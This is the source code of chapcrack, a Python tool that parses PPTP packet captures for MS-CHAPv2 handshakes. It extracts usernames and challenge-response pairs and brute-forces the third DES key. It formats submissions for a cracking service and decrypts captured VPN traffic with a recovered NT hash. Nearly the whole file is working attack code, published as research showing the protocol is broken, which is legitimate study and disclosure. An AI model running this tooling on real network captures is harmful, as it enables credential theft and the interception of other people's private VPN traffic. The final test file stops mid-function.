__FILENAME__ = Command
"""Base class for commands.  Handles parsing supplied arguments."""

import getopt
import sys

__author__    = "Moxie Marlinspike"
__license__   = "GPLv3"
__copyright__ = "Copyright 2012, Moxie Marlinspike"

class Command:

    def __init__(self, argv, options, flags, allowArgRemainder=False):
        try:
            self.flags                     = flags
            self.options                   = ":".join(options) + ":"
            self.values, self.argRemainder = getopt.getopt(argv, self.options + self.flags)

            if not allowArgRemainder and self.argRemainder:
                self.printError("Too many arguments: %s" % self.argRemainder)
        except getopt.GetoptError as e:
            self.printError(e)

    def _getOptionValue(self, flag):
        for option, value in self.values:
            if option == flag:
                return value

        return None

    def _containsOption(self, flag):
        for option, value in self.values:
            if option == flag:
                return True

    def _getInputFile(self):
        inputFile = self._getOptionValue("-i")

        if not inputFile:
            self.printError("Missing input file (-i)")

        return inputFile

    def printError(self, error):
        sys.stderr.write("ERROR: %s\n" % error)
        sys.exit(-1)

########NEW FILE########
__FILENAME__ = CrackK3Command
"""
A command-line interface to cracking K3.
"""
import binascii
import sys
from chapcrack.commands.Command import Command
from chapcrack.crypto.K3Cracker import K3Cracker

__author__    = "Moxie Marlinspike"
__license__   = "GPLv3"
__copyright__ = "Copyright 2012, Moxie Marlinspike"

class CrackK3Command(Command):

    def __init__(self, argv):
        Command.__init__(self, argv, "pc", "")

    def printHelp(self):
        print(
            """Brute forces the third ciphertext/plaintext pair in a handshake.

              crack_k3

            Arguments:
              -p <plaintext>  : The handshake challenge plaintext
              -c <ciphertext> : The handshake c3 ciphertext
            """)

    def execute(self):
        ciphertext = binascii.unhexlify(self._getCiphertext())
        plaintext  = binascii.unhexlify(self._getPlaintext())

        sys.stdout.write("Cracking K3...")
        result     = K3Cracker().crack(plaintext, ciphertext, True)

        assert(result is not None)

        print ""
        print "Found K3: %s" % binascii.hexlify(result)

    def _getPlaintext(self):
        plaintext = self._getOptionValue("-p")

        if not plaintext:
            self.printError("No plaintext specified (-p)")

        if not len(plaintext) == 16:
            self.printError("Plaintext expected to be 8 hex-encoded bytes.")

        return plaintext

    def _getCiphertext(self):
        ciphertext = self._getOptionValue("-c")

        if not ciphertext:
            self.printError("No ciphertext specified (-c)")

        if not len(ciphertext) == 16:
            self.printError("Ciphertext expected to be 8 hex-encoded bytes.")

        return ciphertext


########NEW FILE########
__FILENAME__ = DecryptCommand
"""
The decrypt command. Accepts an input file, output file, and NT hash.

Parses a PPTP capture, searchers for CHAPv2 handshakes which the
supplied NT hash can decrypt, and writes the decrypted PPTP traffic
to the specified output file.
"""

import binascii
import sys
from dpkt import pcap

from chapcrack.commands.Command import Command
from chapcrack.readers.PppPacketReader import PppPacketReader
from chapcrack.state.PppStateManager import PppStateManager

__author__    = "Moxie Marlinspike"
__license__   = "GPLv3"
__copyright__ = "Copyright 2012, Moxie Marlinspike"

class DecryptCommand(Command):

    def __init__(self, argv):
        Command.__init__(self, argv, "ion", "")
        self.inputFile  = self._getInputFile()
        self.outputFile = self._getOutputFile()
        self.nthash     = self._getNtHash()
        self.nthash     = binascii.unhexlify(self.nthash)

    def execute(self):
        capture = open(self.inputFile)
        output  = open(self.outputFile, "w")
        reader  = PppPacketReader(capture)
        writer  = pcap.Writer(output)
        state   = PppStateManager(self.nthash)
        count   = 0

        for packet in reader:
            decryptedPacket = state.addPacket(packet)

            if decryptedPacket:
                writer.writepkt(decryptedPacket)
                count += 1

        print "Wrote %d packets." % count

    def _getNtHash(self):
        nthash = self._getOptionValue("-n")

        if not nthash:
            self.printError("No NT hash specified (-n)")

        return nthash

    def _getOutputFile(self):
        output = self._getOptionValue("-o")

        if not output:
            self.printError("No output path specified (-o)")

        return output

    @staticmethod
    def printHelp():
        print(
            """Decrypts a PPTP capture with a cracked NT hash.

            decrypt

            Arguments:
              -i <input>     : The capture file
              -o <output>    : The output file to write the decrypted capture to.
              -n <hash>      : The base16-encoded cracked NT hash.
            """)

        sys.exit(-1)
########NEW FILE########
__FILENAME__ = HelpCommand
"""
The help command.  Describes details of chapcrack subcommands.
"""

import sys
from chapcrack.commands.RadiusCommand import RadiusCommand
from chapcrack.commands.DecryptCommand import DecryptCommand
from chapcrack.commands.ParseCommand import ParseCommand

__author__    = "Moxie Marlinspike"
__license__   = "GPLv3"
__copyright__ = "Copyright 2012, Moxie Marlinspike"

class HelpCommand:

    COMMANDS = {'parse' : ParseCommand, 'decrypt' : DecryptCommand, 'radius' : RadiusCommand }

    def __init__(self, argv):
        self.argv = argv

    def execute(self):
        if len(self.argv) <= 0:
            self.printGeneralUsage(None)
            return

        if self.argv[0] in HelpCommand.COMMANDS:
            HelpCommand.COMMANDS[self.argv[0]].printHelp()
        else:
            self.printGeneralUsage("Unknown command: %s" % self.argv[0])

    def printHelp(self):
        print(
            """Provides help for individual commands.

            help <command>
            """)

    @staticmethod
    def printGeneralUsage(message):
        if message:
            print ("Error: %s\n" % message)

        sys.stdout.write(
            """chapcrack.py

    Commands (use "chapcrack.py help <command>" to see more):
      parse    -i <capture>
      radius   -C <challenge> -R <response>
      decrypt  -i <capture> -o <decrypted_capture> -n <nthash>
      help     <command>
            """)

        sys.exit(-1)

########NEW FILE########
__FILENAME__ = ParseCommand
"""
The parse command.  Accepts a pcap file containing a PPTP capture.

Parses a packet capture for CHAPv2 handshakes, and prints details
of the handshake necessary for cracking.  These include the client
and server IP addresses, the username, and the plaintext/ciphertext
pairs.
"""
import base64
import sys

from chapcrack.commands.Command import Command
from chapcrack.crypto.K3Cracker import K3Cracker
from chapcrack.readers.ChapPacketReader import ChapPacketReader
from chapcrack.state.MultiChapStateManager import MultiChapStateManager

__author__    = "Moxie Marlinspike"
__license__   = "GPLv3"
__copyright__ = "Copyright 2012, Moxie Marlinspike"

class ParseCommand(Command):

    def __init__(self, argv):
        Command.__init__(self, argv, "i", "n")

    def execute(self):
        inputFile  = self._getInputFile()
        handshakes = MultiChapStateManager()
        capture    = open(inputFile)
        reader     = ChapPacketReader(capture)

        for packet in reader:
            handshakes.addHandshakePacket(packet)

        complete = handshakes.getCompletedHandshakes()

        for server in complete:
            for client in complete[server]:
                print "Got completed handshake [%s --> %s]" % (client, server)

                c1, c2, c3 = complete[server][client].getCiphertext()
                plaintext  = complete[server][client].getPlaintext()
                username   = complete[server][client].getUserName()
                k3         = self._getK3(plaintext, c3)

                self._printParameters(username, plaintext, c1, c2, c3, k3)

    def _printParameters(self, username, plaintext, c1, c2, c3, k3):
        if username is not None:
            print "                   User = %s" % username

        print "                     C1 = %s" % c1.encode("hex")
        print "                     C2 = %s" % c2.encode("hex")
        print "                     C3 = %s" % c3.encode("hex")
        print "                      P = %s" % plaintext.encode("hex")

        if k3 is not None:
            print "                     K3 = %s" % k3.encode("hex")
            print "CloudCracker Submission = $99$%s" % base64.b64encode("%s%s%s%s" % (plaintext, c1, c2, k3[0:2]))

    def _getK3(self, plaintext, ciphertext):
        if not self._containsOption("-n"):
            sys.stdout.write("Cracking K3...")
            k3 = K3Cracker().crack(plaintext, ciphertext, True)
            print ""

            return k3

        return None

    @staticmethod
    def printHelp():
        print(
            """Parses a PPTP capture and prints the ciphertext/plaintext pairs for decrypting.

              parse

            Arguments:
              -i <input> : The capture file
              -n         : If specified, doesn't crack K3
            """)

########NEW FILE########
__FILENAME__ = RadiusCommand
"""
The radius command.  Accepts "challange" and "response" parameters.

Accepts "challenge" and "response" parameters as output by freeradius-wpe
and turns them into the components necessary for submitting to CloudCracker.
"""
import binascii

from chapcrack.commands.Command import Command
from chapcrack.commands.ParseCommand import ParseCommand

__author__    = "Moxie Marlinspike"
__license__   = "GPLv3"
__copyright__ = "Copyright 2012, Moxie Marlinspike"

class RadiusCommand(ParseCommand):

    def __init__(self, argv):
        Command.__init__(self, argv, "CR", "")

    def execute(self):
        plaintext = self._getChallenge()
        response  = self._getResponse()

        c1, c2, c3 = response[0:8], response[8:16], response[16:24]
        k3         = self._getK3(plaintext, c3)

        self._printParameters(None, plaintext, c1, c2, c3, k3)

    def _getChallenge(self):
        challenge = self._getOptionValue("-C")

        if not challenge:
            self.printError("Missing challenge (-C)")

        challenge = binascii.unhexlify(challenge.replace(":", ""))

        if len(challenge) != 8:
            self.printError("Invalid challenge length %d" % len(challenge))

        return challenge

    def _getResponse(self):
        response = self._getOptionValue("-R")

        if not response:
            self.printError("Missing response (-R)")

        response = binascii.unhexlify(response.replace(":", ""))

        if len(response) != 24:
            self.printError("Invalid response length %d" % len(response))

        return response

    @staticmethod
    def printHelp():
        print(
            """Generates a CloudCracker token from the output of a FreeRadius interception.

              radius

              Arguments:
                -C <challenge> : The challenge in hexadecimal format.
                -R <response>  : The response in hexadecimal format.
            """)

########NEW FILE########
__FILENAME__ = K3Cracker
"""
A little utility class to crack 'K3', which is the third DES key
derived from the NTLM hash of the user's passphrase.  There are
only two bytes of key material left at this point, so CHAPv2 just
pads the other five with 0x00.

This class uses the python 'multiprocessing' module to iterate
over the 2^16 possibilities and return K3.
"""
from multiprocessing import Pool
from passlib.utils import des
import sys

__author__    = "Moxie Marlinspike"
__license__   = "GPLv3"
__copyright__ = "Copyright 2012, Moxie Marlinspike"

def checkKey(plaintext, ciphertext, b1, b2):
    keyCandidateBytes = chr(b1) + chr(b2) + (chr(0x00) * 5)
    keyCandidate      = des.expand_des_key(keyCandidateBytes)
    result            = des.des_encrypt_block(keyCandidate, plaintext)

    if result == ciphertext:
        return keyCandidateBytes

class CheckKeyPartial(object):

    def __init__(self, plaintext, ciphertext, b1):
        self.plaintext  = plaintext
        self.ciphertext = ciphertext
        self.b1         = b1

    def __call__(self, b2):
        return checkKey(self.plaintext, self.ciphertext, self.b1, b2)

class K3Cracker:

    def crack(self, plaintext, ciphertext, markTime=False):
        pool = Pool()

        for b1 in range(0, 256):
            if markTime and b1 % 20 == 0:
                sys.stdout.write(".")
                sys.stdout.flush()

            results = pool.map(CheckKeyPartial(plaintext, ciphertext, b1), range(0, 256))

            for result in results:
                if result is not None:
                    return result

########NEW FILE########
__FILENAME__ = CcpPacket
"""
A class to encapsulate and parse a PPP Compression Control packet.
"""

__author__    = "Moxie Marlinspike"
__license__   = "GPLv3"
__copyright__ = "Copyright 2012, Moxie Marlinspike"

class CcpPacket:

    def __init__(self, data, sourceIp, destinationIp):
        self.data          = data
        self.sourceIp      = sourceIp
        self.destinationIp = destinationIp

    def isConfigurationRequest(self):
        return ord(self.data[0]) == 1

    def isConfigurationAck(self):
        return ord(self.data[0]) == 2

    def isConfigurationNack(self):
        return ord(self.data[0]) == 3

    def isStateless(self):
        return ord(self.data[6]) & 0x01 > 0

    def is128bit(self):
        return ord(self.data[9]) == 0x40

    def getSourceAddress(self):
        return self.sourceIp

    def getDestinationAddress(self):
        return self.destinationIp

########NEW FILE########
__FILENAME__ = ChapPacket
"""
A class to encapsulate and parse an MS-CHAPv2 Packet.
"""

__author__    = "Moxie Marlinspike"
__license__   = "GPLv3"
__copyright__ = "Copyright 2012, Moxie Marlinspike"

class ChapPacket:

    def __init__(self, data, src, dst):
        self.data = data
        self.src  = src
        self.dst  = dst

    def getServerAddress(self):
        if self.isChallenge():
            return self.src
        elif self.isResponse():
            return self.dst
        elif self.isSuccess():
            return self.src

    def getClientAddress(self):
        if self.isChallenge():
            return self.dst
        elif self.isResponse():
            return self.src
        elif self.isSuccess():
            return self.dst

    def getIdentifier(self):
        return ord(self.data[1])

    def isChallenge(self):
        return ord(self.data[0]) == 1

    def isResponse(self):
        return ord(self.data[0]) == 2

    def isSuccess(self):
        return ord(self.data[0]) == 3

    def getName(self):
        payload         = self._getPayload()
        challengeLength = ord(payload[0])

        return payload[1+challengeLength:]

    def getChallenge(self):
        payload         = self._getPayload()
        challengeLength = ord(payload[0])

        return payload[1:challengeLength+1]

    def getPeerChallenge(self):
        payload = self._getPayload()
        return payload[1:17]

    def getNtResponse(self):
        payload = self._getPayload()
        return payload[25:49]

    def _getPayload(self):
        return self.data[4:self._getPayloadLength()]

    def _getPayloadLength(self):
        high = ord(self.data[2])
        low  = ord(self.data[3])

        return (high << 8) | low

########NEW FILE########
__FILENAME__ = MppePacket
"""
A class to encapsulate and parse a 'Microsoft Point-To-Point Encryption' packet.
"""

import socket

__author__    = "Moxie Marlinspike"
__license__   = "GPLv3"
__copyright__ = "Copyright 2012, Moxie Marlinspike"

class MppePacket:

    def __init__(self, eth_packet):
        self.eth_packet = eth_packet
        self.ppp_data   = eth_packet.data.data.data.data

    def getSourceAddress(self):
        return socket.inet_ntoa(self.eth_packet.data.src)

    def getDestinationAddress(self):
        return socket.inet_ntoa(self.eth_packet.data.dst)

    def isFlushed(self):
        header = self.ppp_data[0]
        return ord(header) & 0x80 != 0

    def isEncrypted(self):
        header = self.ppp_data[0]
        return ord(header) & 0x10 != 0

    def getCounter(self):
        highBits = ord(self.ppp_data[0]) & 0x0F
        lowBits  = ord(self.ppp_data[1]) & 0xFF

        return highBits << 7 | lowBits

    def getData(self):
        return self.ppp_data[2:]

    def getEthernetFrame(self):
        return self.eth_packet

########NEW FILE########
__FILENAME__ = ChapPacketReader
"""
Given a packet capture, this class will iterate over
the MS-CHAPv2 packets in that capture.
"""

from chapcrack.packets.ChapPacket import ChapPacket
from chapcrack.readers.PacketReader import PacketReader

__author__    = "Moxie Marlinspike"
__license__   = "GPLv3"
__copyright__ = "Copyright 2012, Moxie Marlinspike"

import socket
import dpkt

class ChapPacketReader(PacketReader):

    def __init__(self, capture):
        PacketReader.__init__(self, capture)

    def _parseForTargetPacket(self, data):
        eth_packet = dpkt.ethernet.Ethernet(data)

        if isinstance(eth_packet.data, dpkt.ip.IP):
            ip_packet = eth_packet.data

            if ip_packet.get_proto(ip_packet.p) == dpkt.gre.GRE:
                gre_packet = ip_packet.data

                if hasattr(gre_packet, 'data') and isinstance(gre_packet.data, dpkt.ppp.PPP):
                    ppp_packet = gre_packet.data

                    if ppp_packet.p == 255:
                        ppp_packet.unpack(ppp_packet.pack()[2:])

                    if ppp_packet.p == 49699:
                        return ChapPacket(ppp_packet.data,
                            socket.inet_ntoa(ip_packet.src),
                            socket.inet_ntoa(ip_packet.dst))

        return None



########NEW FILE########
__FILENAME__ = PacketReader
"""
Base packet reader implementation.  Will iterate over packets
specified by a subclass.
"""

import dpkt

__author__    = "Moxie Marlinspike"
__license__   = "GPLv3"
__copyright__ = "Copyright 2012, Moxie Marlinspike"

class PacketReader:

    def __init__(self, capture):
        self.capture = capture
        self.reader  = dpkt.pcap.Reader(capture)

    def __iter__(self):
        for timestamp, data in self.reader:
            packet = self._parseForTargetPacket(data)

            if packet:
                yield packet

    def _parseForTargetPacket(self, data):
        assert False

########NEW FILE########
__FILENAME__ = PppPacketReader
"""
Given a packet capture, this class will iterate over the PPP packets
that we care about within that capture.  These include CHAP, CCP, and
MPPE packets.
"""

import socket
import dpkt

from chapcrack.packets.CcpPacket import CcpPacket
from chapcrack.packets.ChapPacket import ChapPacket
from chapcrack.packets.MppePacket import MppePacket
from chapcrack.readers.PacketReader import PacketReader

__author__    = "Moxie Marlinspike"
__license__   = "GPLv3"
__copyright__ = "Copyright 2012, Moxie Marlinspike"

class PppPacketReader(PacketReader):

    def __init__(self, capture):
        PacketReader.__init__(self, capture)

    def _parseForTargetPacket(self, data):
        eth_packet = dpkt.ethernet.Ethernet(data)

        if isinstance(eth_packet.data, dpkt.ip.IP):
            ip_packet = eth_packet.data

            if ip_packet.get_proto(ip_packet.p) == dpkt.gre.GRE:
                gre_packet = ip_packet.data

                if hasattr(gre_packet, 'data') and isinstance(gre_packet.data, dpkt.ppp.PPP):
                    ppp_packet = gre_packet.data

                    if ppp_packet.p == 255:
                        ppp_packet.unpack(ppp_packet.pack()[2:])

                    if ppp_packet.p == 49699:
                        return ChapPacket(ppp_packet.data,
                                          socket.inet_ntoa(ip_packet.src),
                                          socket.inet_ntoa(ip_packet.dst))

                    if ppp_packet.p == 253:
                        return MppePacket(eth_packet)

                    if ppp_packet.p == 33021:
                        return CcpPacket(ppp_packet.data,
                                         socket.inet_ntoa(ip_packet.src),
                                         socket.inet_ntoa(ip_packet.dst))

        return None
########NEW FILE########
__FILENAME__ = CcpStateManager
"""
Manages the current state of a CCP handshake.
"""

__author__    = "Moxie Marlinspike"
__license__   = "GPLv3"
__copyright__ = "Copyright 2012, Moxie Marlinspike"

class CcpStateManager:

    def __init__(self, clientAddress, serverAddress):
        self.handshake     = {}
        self.clientAddress = clientAddress
        self.serverAddress = serverAddress

    def addCcpPacket(self, packet):
        if packet.isConfigurationRequest() and packet.getSourceAddress() == self.clientAddress:
            self.handshake['request'] = packet

        if packet.isConfigurationAck() and packet.getSourceAddress == self.serverAddress:
            self.handshake['ack'] = packet

    def isComplete(self):
        return len(self.handshake) == 2

    def isStateless(self):
        return self.handshake['request'].isStateless()

    def is128bit(self):
        return self.handshake['request'].is128bit()

########NEW FILE########
__FILENAME__ = ChapStateManager
"""
Manages the current state of a MS-CHAPv2 handshake.
"""

import hashlib
from passlib.utils import des

__author__    = "Moxie Marlinspike"
__license__   = "GPLv3"
__copyright__ = "Copyright 2012, Moxie Marlinspike"

class ChapStateManager:

    def __init__(self):
        self.handshake = {}

    def addHandshakePacket(self, packet):
        if packet.isChallenge():
            self.handshake = {'challenge': packet}
        elif not packet.isChallenge():
            if packet.isResponse():
                self.handshake['response'] = packet
            elif packet.isSuccess():
                self.handshake['success'] = packet

    def isComplete(self):
        return len(self.handshake) == 3

    def isForHash(self, nthash):
        plaintext  = self.getPlaintext()
        c1, c2, c3 = self.getCiphertext()
        k1, k2, k3 = self._getKeysFromHash(nthash)

        return des.des_encrypt_block(k1, plaintext) == c1 and \
               des.des_encrypt_block(k2, plaintext) == c2 and \
               des.des_encrypt_block(k3, plaintext) == c3


    def getHandshake(self):
        return self.handshake

    def getNtResponse(self):
        assert self.isComplete()
        return self.handshake['response'].getNtResponse()

    def getUserName(self):
        assert self.isComplete()
        return self.handshake['response'].getName()

    def getCiphertext(self):
        ntResponse = self.getNtResponse()
        return ntResponse[0:8], ntResponse[8:16], ntResponse[16:24]

    def getPlaintext(self):
        authenticatorChallenge = self.handshake['challenge'].getChallenge()
        peerChallenge          = self.handshake['response'].getPeerChallenge()
        username               = self.handshake['response'].getName()

        sha = hashlib.sha1()
        sha.update(peerChallenge)
        sha.update(authenticatorChallenge)
        sha.update(username)
        return sha.digest()[0:8]

    def getAuthenticatorChallenge(self):
        return self.handshake['challenge'].getChallenge()

    def _getKeysFromHash(self, nthash):
        k1 = nthash[0:7]
        k1 = des.expand_des_key(k1)

        k2 = nthash[7:14]
        k2 = des.expand_des_key(k2)

        k3  = nthash[14:16]
        k3 += (chr(0x00) * 5)
        k3  = des.expand_des_key(k3)

        return k1, k2, k3

########NEW FILE########
__FILENAME__ = MppeStateManager
"""
Manages the current state of an MPPE stream.
"""

from dpkt.ip import IP
from passlib.utils.md4 import md4
from M2Crypto.RC4 import RC4
import copy
import hashlib
import binascii

__author__    = "Moxie Marlinspike"
__license__   = "GPLv3"
__copyright__ = "Copyright 2012, Moxie Marlinspike"

class MppeStateManager:

    MAGIC_ONE   = binascii.unhexlify("5468697320697320746865204d505045204d6173746572204b6579")
    MAGIC_TWO   = binascii.unhexlify("4f6e2074686520636c69656e7420736964652c20746869732069732074686520"
                                     "73656e64206b65793b206f6e207468652073657276657220736964652c206974"
                                     "206973207468652072656365697665206b65792e")
    MAGIC_THREE = binascii.unhexlify("4f6e2074686520636c69656e7420736964652c20746869732069732074686520"
                                     "72656365697665206b65793b206f6e207468652073657276657220736964652c"
                                     "206974206973207468652073656e64206b65792e")

    SHS_PAD1    = binascii.unhexlify("00000000000000000000000000000000000000000000000000000000000000000000000000000000")
    SHS_PAD2    = binascii.unhexlify("f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2")

    def __init__(self, clientAddress, serverAddress, nthash, response):
        self.clientAddress   = clientAddress
        self.serverAddress   = serverAddress
        self.masterKey       = self._getMasterKey(self._getPasswordHashHash(nthash), response)

        self.clientMasterKey = self._getAsymmetricMasterKey(self.masterKey, self.MAGIC_TWO)
        self.serverMasterKey = self._getAsymmetricMasterKey(self.masterKey, self.MAGIC_THREE)

        self.clientSessionKey = self._getNextKeyFromSha(self.clientMasterKey, self.clientMasterKey)
        self.serverSessionKey = self._getNextKeyFromSha(self.serverMasterKey, self.serverMasterKey)

        self.clientSessionCounter = -1
        self.serverSessionCounter = -1

    def addMppePacket(self, packet):
        stateGetter, stateSetter = (None, None)

        if packet.getSourceAddress() == self.clientAddress:
            stateGetter, stateSetter = (self._getClientState, self._setClientState)
        elif packet.getSourceAddress() == self.serverAddress:
            stateGetter, stateSetter = (self._getServerState, self._setServerState)
        else:
            return None

        masterKey, sessionKey, counter = stateGetter()

        if counter == packet.getCounter():
            return self._decryptPacket(packet, sessionKey)
        elif self._isIncrementedCounter(counter, packet.getCounter()):
            sessionKey = self._getIncrementedSessionKey(masterKey, sessionKey,
                                                        counter, packet.getCounter())
            stateSetter(sessionKey, packet.getCounter())
            return self._decryptPacket(packet, sessionKey)
        else:
            print "Old packet: %s" % packet.getCounter()
            return None

    def _decryptPacket(self, packet, sessionKey):
        cipher    = RC4(key=sessionKey)
        plaintext = cipher.update(packet.getData())

        if ord(plaintext[0]) == 0x00 and ord(plaintext[1]) == 0x21:
            ethPacket = packet.getEthernetFrame()
            ethPacket = copy.deepcopy(ethPacket)
            ipPacket  = IP()
            ipPacket.unpack(plaintext[2:])

            ethPacket.data = ipPacket

            return ethPacket

        return None

    def _getIncrementedSessionKey(self, masterKey, sessionKey, sessionCounter, packetCounter):
        difference = 0

        if packetCounter > sessionCounter:
            difference = packetCounter - sessionCounter
        else:
            difference  = 4095 - sessionCounter
            difference += packetCounter

        for i in range(0, difference):
            sessionKey = self._getNextKey(masterKey, sessionKey)

        return sessionKey

    def _isIncrementedCounter(self, stateCounter, packetCounter):
        if packetCounter > stateCounter and (packetCounter - stateCounter) < 2000:
            return True

        if packetCounter < stateCounter and packetCounter < 250 and stateCounter > 3844:
            return True

        return False

    def _getClientState(self):
        return self.clientMasterKey, self.clientSessionKey, self.clientSessionCounter

    def _getServerState(self):
        return self.serverMasterKey, self.serverSessionKey, self.serverSessionCounter

    def _setClientState(self, sessionKey, counter):
        self.clientSessionKey     = sessionKey
        self.clientSessionCounter = counter

    def _setServerState(self, sessionKey, counter):
        self.serverSessionKey     = sessionKey
        self.serverSessionCounter = counter

    def _getPasswordHashHash(self, nthash):
        digest = md4()
        digest.update(nthash)
        return digest.digest()

    def _getMasterKey(self, passwordHashHash, response):
        digest = hashlib.sha1()
        digest.update(passwordHashHash)
        digest.update(response)
        digest.update(self.MAGIC_ONE)
        return digest.digest()[0:16]

    def _getAsymmetricMasterKey(self, masterKey, magic):
        digest = hashlib.sha1()
        digest.update(masterKey)
        digest.update(self.SHS_PAD1)
        digest.update(magic)
        digest.update(self.SHS_PAD2)
        return digest.digest()[:16]

    def _getNextKeyFromSha(self, masterKey, lastSessionKey):
        digest = hashlib.sha1()
        digest.update(masterKey)
        digest.update(self.SHS_PAD1)
        digest.update(lastSessionKey)
        digest.update(self.SHS_PAD2)
        return digest.digest()[:16]

    def _getNextKey(self, masterKey, lastSessionKey):
        nextSessionKey = self._getNextKeyFromSha(masterKey, lastSessionKey)
        cipher = RC4(key=nextSessionKey)
        return cipher.update(nextSessionKey)
########NEW FILE########
__FILENAME__ = MultiChapStateManager
"""
Layer of indirection to keep track of multiple ongoing MS-CHAPv2 handshake states.
"""

from chapcrack.state.ChapStateManager import ChapStateManager

__author__    = "Moxie Marlinspike"
__license__   = "GPLv3"
__copyright__ = "Copyright 2012, Moxie Marlinspike"

class MultiChapStateManager:

    def __init__(self):
        self.servers = {}

    def addHandshakePacket(self, packet):
        serverAddress = packet.getServerAddress()
        clientAddress = packet.getClientAddress()

        if serverAddress not in self.servers:
            self.servers[serverAddress] = {}

        if clientAddress not in self.servers[serverAddress]:
            self.servers[serverAddress][clientAddress] = ChapStateManager()

        self.servers[serverAddress][clientAddress].addHandshakePacket(packet)

    def getCompletedHandshakes(self):
        results = {}

        for server in self.servers:
            for client in self.servers[server]:

                if self.servers[server][client].isComplete():
                    results[server] = {client : self.servers[server][client]}

        return results

########NEW FILE########
__FILENAME__ = PppStateManager
"""
Keeps track of a PPP connection's state.

Manages the CCP, CHAP, and MPPE states for a given PPP connection.
"""

from chapcrack.packets.CcpPacket import CcpPacket
from chapcrack.packets.ChapPacket import ChapPacket
from chapcrack.packets.MppePacket import MppePacket
from chapcrack.state.CcpStateManager import CcpStateManager
from chapcrack.state.ChapStateManager import ChapStateManager
from chapcrack.state.MppeStateManager import MppeStateManager

__author__    = "Moxie Marlinspike"
__license__   = "GPLv3"
__copyright__ = "Copyright 2012, Moxie Marlinspike"

class PppStateManager:

    def __init__(self, nthash):
        self.servers = {}
        self.nthash  = nthash

    def addPacket(self, packet):
        if isinstance(packet, ChapPacket):
            self.addChapPacket(packet)
        elif isinstance(packet, CcpPacket):
            self.addCcpPacket(packet)
        elif isinstance(packet, MppePacket):
            return self.addMppePacket(packet)

    def addMppePacket(self, packet):
        sourceAddress      = packet.getSourceAddress()
        destinationAddress = packet.getDestinationAddress()

        if self._isCcpComplete(sourceAddress, destinationAddress):
            self._initializeMppeStateManagerIfNecessary(sourceAddress, destinationAddress)
            return self.servers[destinationAddress][sourceAddress]['mppe'].addMppePacket(packet)

        if self._isCcpComplete(destinationAddress, sourceAddress):
            self._initializeMppeStateManagerIfNecessary(destinationAddress, sourceAddress)
            return self.servers[sourceAddress][destinationAddress]['mppe'].addMppePacket(packet)

    def addCcpPacket(self, packet):
        sourceAddress      = packet.getSourceAddress()
        destinationAddress = packet.getDestinationAddress()

        if self._isChapComplete(sourceAddress, destinationAddress, self.nthash):
            self._initializeCcpStateManagerIfNecessary(sourceAddress, destinationAddress)
            self.servers[destinationAddress][sourceAddress]['ccp'].addCcpPacket(packet)

        elif self._isChapComplete(destinationAddress, sourceAddress, self.nthash):
            self._initializeCcpStateManagerIfNecessary(destinationAddress, sourceAddress)
            self.servers[sourceAddress][destinationAddress]['ccp'].addCcpPacket(packet)

    def addChapPacket(self, packet):
        serverAddress = packet.getServerAddress()
        clientAddress = packet.getClientAddress()

        self._initializeChapStateManagerIfNecessary(clientAddress, serverAddress)
        self.servers[serverAddress][clientAddress]['chap'].addHandshakePacket(packet)

    def _initializeChapStateManagerIfNecessary(self, clientAddress, serverAddress):
        if serverAddress not in self.servers:
            self.servers[serverAddress] = {}

        if clientAddress not in self.servers[serverAddress]:
            self.servers[serverAddress][clientAddress] = {'chap' : ChapStateManager()}

    def _initializeCcpStateManagerIfNecessary(self, clientAddress, serverAddress):
        if 'ccp' not in self.servers[serverAddress][clientAddress]:
            self.servers[serverAddress][clientAddress]['ccp'] = CcpStateManager(clientAddress, serverAddress)

    def _initializeMppeStateManagerIfNecessary(self, clientAddress, serverAddress):
        if 'mppe' not in self.servers[serverAddress][clientAddress]:
            response = self.servers[serverAddress][clientAddress]['chap'].getNtResponse()
            self.servers[serverAddress][clientAddress]['mppe'] = MppeStateManager(clientAddress, serverAddress,
                                                                                  self.nthash, response)

    def _isChapComplete(self, clientAddress, serverAddress, nthash):
        return serverAddress in self.servers and \
               clientAddress in self.servers[serverAddress] and \
               self.servers[serverAddress][clientAddress]['chap'].isComplete() and \
               self.servers[serverAddress][clientAddress]['chap'].isForHash(nthash)

    def _isCcpComplete(self, clientAddress, serverAddress):
        return serverAddress in self.servers and \
               clientAddress in self.servers[serverAddress] and \
               'ccp' in self.servers[serverAddress][clientAddress] and \
               self.servers[serverAddress][clientAddress]['ccp'].isComplete and \
               self.servers[serverAddress][clientAddress]['ccp'].isStateless() and \
               self.servers[serverAddress][clientAddress]['ccp'].is128bit()

########NEW FILE########
__FILENAME__ = _version
__version__ = "0.2"
########NEW FILE########
__FILENAME__ = chapcrack
#!/usr/bin/env python

"""A tool for parsing and decrypting PPTP packet captures."""

import sys
from chapcrack.commands.CrackK3Command import CrackK3Command
from chapcrack.commands.DecryptCommand import DecryptCommand
from chapcrack.commands.HelpCommand import HelpCommand
from chapcrack.commands.ParseCommand import ParseCommand
from chapcrack.commands.RadiusCommand import RadiusCommand

__author__    = "Moxie Marlinspike"
__license__   = "GPLv3"
__copyright__ = "Copyright 2012, Moxie Marlinspike"

def main(argv):
    if len(argv) < 1:
        HelpCommand.printGeneralUsage("Missing command")

    if argv[0] == 'parse':
        ParseCommand(argv[1:]).execute()
    elif argv[0] == 'decrypt':
        DecryptCommand(argv[1:]).execute()
    elif argv[0] == 'help':
        HelpCommand(argv[1:]).execute()
    elif argv[0] == 'crack_k3':
        CrackK3Command(argv[1:]).execute()
    elif argv[0] == 'radius':
        RadiusCommand(argv[1:]).execute()
    else:
        HelpCommand.printGeneralUsage("Unknown command: %s" % argv[0])

if __name__ == '__main__':
    main(sys.argv[1:])

########NEW FILE########
__FILENAME__ = nthash
#!/usr/bin/env python

"""Generates an NT hash from a supplied argument."""

import binascii
import sys

from passlib.hash import nthash

__author__    = "Moxie Marlinspike"
__license__   = "GPLv3"
__copyright__ = "Copyright 2012, Moxie Marlinspike"

print "Hashing: %s" % sys.argv[1]
hash = nthash.raw_nthash(sys.argv[1])
print binascii.hexlify(hash)
########NEW FILE########
__FILENAME__ = Decrypt_Test
from passlib.hash import nthash
import unittest
import binascii
from M2Crypto.RC4 import RC4
from chapcrack.state.MppeStateManager import MppeStateManager

class DecryptTest(unittest.TestCase):

    def test_derivation(self):
        hash     = nthash.raw_nthash("clientPass")
        response = binascii.unhexlify("82309ECD8D708B5EA08FAA3981CD83544233114A3D85D6DF")

        state    = MppeStateManager("", "", hash, response)

